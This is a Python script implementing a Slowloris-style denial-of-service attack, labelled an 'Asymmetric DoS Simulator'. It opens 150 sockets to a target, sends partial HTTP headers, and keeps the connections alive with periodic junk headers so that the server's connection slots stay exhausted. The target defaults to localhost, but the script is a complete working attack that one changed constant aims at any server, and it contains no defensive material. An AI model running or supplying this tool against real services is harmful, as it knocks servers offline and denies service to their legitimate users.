import socket
import time
import sys
import random

TARGET_IP = "127.0.0.1" 
TARGET_PORT = 5000
SOCKET_COUNT = 150

print(f"[*] Initializing Asymmetric DoS Simulator against {TARGET_IP}:{TARGET_PORT}")
sockets = []

# Stage 1: Exhaustion
for _ in range(SOCKET_COUNT):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(4)
        s.connect((TARGET_IP, TARGET_PORT))
        s.send(f"GET /?{random.randint(0, 2000)} HTTP/1.1\r\n".encode("utf-8"))
        s.send(b"User-Agent: Research-Exhaustion-Engine\r\n")
        sockets.append(s)
    except socket.error:
        break

print(f"[+] Established {len(sockets)} concurrent connections.")

# Stage 2: Maintenance
while True:
    try:
        print(f"[*] Sending slow keep-alive headers to maintain locks...")
        for s in list(sockets):
            try:
                s.send(f"X-a: {random.randint(1, 5000)}\r\n".encode("utf-8"))
            except socket.error:
                sockets.remove(s)
        
        for _ in range(SOCKET_COUNT - len(sockets)):
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(4)
                s.connect((TARGET_IP, TARGET_PORT))
                s.send(f"GET /?{random.randint(0, 2000)} HTTP/1.1\r\n".encode("utf-8"))
                sockets.append(s)
            except socket.error:
                continue
                
        time.sleep(10)
        
    except KeyboardInterrupt:
        print("\n[-] Attack aborted. Releasing server.")
        for s in sockets:
            s.close()
        sys.exit()